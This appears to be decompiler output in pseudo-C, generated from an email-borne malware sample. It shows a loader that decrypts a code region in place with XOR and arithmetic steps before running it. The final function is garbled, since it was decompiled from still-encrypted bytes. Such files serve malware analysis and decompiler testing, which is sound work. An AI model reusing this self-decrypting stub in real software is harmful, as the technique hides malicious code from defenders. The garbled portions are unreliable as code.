// subject.c
// Generated on 5/4/2015 12:14:12 AM by decompiling malware_via_email/malware_0033/ia32_pe/subject.exe
// using Decompiler version 0.4.2.0.

#include "subject.h"

void fn00401000(word32 esi, word32 edi)
{
	byte cl_15;
	word32 edx_16 = fn00401078(0x00401131, 0x0000063C, out cl_15);
	fn00401131(edx_16, esi, edi, cl_15, dwLoc20);
	byte cl_37;
	fn00401078(0x00401131, 0x0000063C, out cl_37);
	if (false)
	{
		Mem50[fp - 0x00000018:word32] = 0x00405000;
		Mem52[fp - 0x0000001C:word32] = 0x00401000;
		lstrcpyA(Mem52[fp - 0x0000001C:LPSTR], Mem52[fp - 24:LPCSTR]);
	}
	return;
}

word32 fn00401078(word32 dwArg04, word32 dwArg08, ptr32 clOut)
{
	*clOut = cl;
	word32 dwLoc08_24 = 0x00000000;
	while (dwLoc08_24 < dwArg08)
	{
		if (dwLoc08_24 > 0x00000000 && (dwLoc08_24 & 0x00000001) == 0x00000000)
		{
			word32 eax_125 = dwLoc08_24 + dwArg04;
			Mem132[dwArg04 + dwLoc08_24:byte] = (byte) (DPB(eax_125, Mem0[eax_125 + 0x00000000:byte], 0, 8) ^ 0x0000003D);
		}
		if (dwLoc08_24 > 0x00000001)
		{
			word32 eax_109 = dwLoc08_24 + dwArg04;
			Mem115[dwArg04 + dwLoc08_24:byte] = (byte) (DPB(eax_109, Mem0[eax_109 + 0x00000000:byte], 0, 8) + 0x00000008);
		}
		if (dwLoc08_24 > 0x00000002 && (dwLoc08_24 - 0x00000002 & 0x00000001) == 0x00000000)
		{
			word32 eax_98 = dwLoc08_24 + dwArg04;
			Mem104[dwArg04 + dwLoc08_24:byte] = (byte) (DPB(eax_98, Mem0[eax_98 + 0x00000000:byte], 0, 8) - 0x00000057);
		}
		word64 edx_eax_53 = SEQ(dwLoc08_24 >> 0x0000001F, dwLoc08_24);
		byte cl_50;
		*clOut = 0x03;
		edx = edx_eax_53 % 0x00000003;
		if (edx_eax_53 % 0x00000003 == 0x00000000)
		{
			word32 ecx_76 = dwArg04 + dwLoc08_24;
			Mem87[ecx_76 + 0x00000000:byte] = Mem0[dwLoc08_24 + dwArg04:byte] - (byte) dwLoc08_24;
			byte cl_77;
			*clOut = (byte) ecx_76;
			edx = dwLoc08_24;
		}
		dwLoc08_24 = dwLoc08_24 + 0x00000001;
	}
	return edx;
}

void fn00401131(word32 edx, word32 esi, word32 edi, byte cl, word32 dwArg00)
{
fn00401131_entry:
l00401131:
	byte al_6 = (byte) (fp - 0x00000004)
	branch SO l0040113C
l00401136:
	Mem34[esi - 0x00000008:byte] = Mem0[esi - 0x00000008:byte] & 0x72
l0040113C:
	branch al_6 >u 0x61 l004011A9
l00401140:
	__lock()
	Mem25[edx + 0xF75BF60A:byte] = Mem0[edx + 0xF75BF60A:byte] - dl
l004011A9:
fn00401131_exit:
}

